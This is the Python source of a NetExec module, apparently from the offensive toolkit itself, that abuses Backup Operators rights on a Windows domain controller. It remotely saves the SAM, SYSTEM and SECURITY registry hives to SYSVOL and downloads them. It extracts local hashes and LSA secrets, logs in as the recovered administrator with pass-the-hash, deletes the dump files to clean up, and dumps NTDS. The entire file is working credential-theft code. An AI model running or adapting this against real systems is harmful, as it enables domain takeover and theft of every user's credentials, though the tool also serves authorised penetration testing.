import time
import os
import datetime

from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
from impacket.smbconnection import SessionError
from impacket.dcerpc.v5 import transport, rrp

from nxc.paths import NXC_PATH

class NXCModule:
    name = "backup_operator"
    description = "Exploit user in backup operator group to dump NTDS @mpgn_x64"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.domain_admin = None
        self.domain_admin_hash = None

    def options(self, context, module_options):
        """OPTIONS"""

    def on_login(self, context, connection):
        connection.args.share = "SYSVOL"
        # enable remote registry
        remoteOps = RemoteOperations(connection.conn)
        context.log.display("Triggering start trough named pipe...")
        self.triggerWinReg(connection.conn, context)
        remoteOps.connectWinReg()

        try:
            dce = remoteOps.getRRP()
            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                hRootKey, subKey = self.__strip_root_key(dce, hive)
                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
                context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
                try:
                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
                    context.log.highlight(f"Saved {hive} to {outputFileName}")
                except Exception as e:
                    context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")

        except (Exception, KeyboardInterrupt) as e:
            context.log.fail(str(e))
        finally:
            if remoteOps:
                remoteOps.finish()

        # copy remote file to local
        remoteFileName = "SAM"
        log_sam = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.{remoteFileName}".replace(":", "-"))
        connection.get_file_single(remoteFileName, log_sam)

        remoteFileName = "SECURITY"
        log_security = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.{remoteFileName}".replace(":", "-"))
        connection.get_file_single(remoteFileName, log_security)

        remoteFileName = "SYSTEM"
        log_system = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.{remoteFileName}".replace(":", "-"))
        connection.get_file_single(remoteFileName, log_system)

        # read local file
        try:
            def parse_sam(secret):
                context.log.highlight(secret)
                if not self.domain_admin:
                    first_line = secret.strip().splitlines()[0]
                    fields = first_line.split(":")
                    self.domain_admin = fields[0]
                    self.domain_admin_hash = fields[3]

            localOperations = LocalOperations(log_system)
            bootKey = localOperations.getBootKey()
            sam_hashes = SAMHashes(log_sam, bootKey, isRemote=False, perSecretCallback=lambda secret: parse_sam(secret))
            sam_hashes.dump()
            sam_hashes.finish()

            LSA = LSASecrets(log_security, bootKey, remoteOps, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
        except Exception as e:
            context.log.fail(f"Fail to dump the sam and lsa: {e!s}")

        if self.domain_admin:
            context.log.display(f"Cleaning dump with user {self.domain_admin} and hash {self.domain_admin_hash} on domain {connection.domain}")
            connection.conn.logoff()
            connection.create_conn_obj()
            connection.hash_login(connection.domain, self.domain_admin, self.domain_admin_hash)
            connection.execute("del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM")
            context.log.display("Successfully deleted dump files !")

            context.log.display("Dumping NTDS...")
            connection.ntds()
        else:
            context.log.display("Use the domain admin account to clean the file on the remote host")
            context.log.display("netexec smb dc_ip -u user -p pass -x 'del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM'")

    def triggerWinReg(self, connection, context):
        # original idea from https://twitter.com/splinter_code/status/1715876413474025704
        tid = connection.connectTree("IPC$")
        try:
            connection.openFile(tid, r"\winreg", 0x12019f, creationOption=0x40, fileAttributes=0x80)
        except SessionError as e:
            # STATUS_PIPE_NOT_AVAILABLE error is expected
            context.log.debug(str(e))
        # give remote registry time to start
        time.sleep(1)

    def __strip_root_key(self, dce, keyName):
        # Let's strip the root key
        keyName.split("\\")[0]
        subKey = "\\".join(keyName.split("\\")[1:])
        ans = rrp.hOpenLocalMachine(dce)
        hRootKey = ans["phKey"]
        return hRootKey, subKey


class RemoteOperations:
    def __init__(self, smbConnection):
        self.__smbConnection = smbConnection
        self.__stringBindingWinReg = r"ncacn_np:445[\pipe\winreg]"
        self.__rrp = None

    def getRRP(self):
        return self.__rrp

    def connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def finish(self):
        if self.__rrp is not None:
            self.__rrp.disconnect()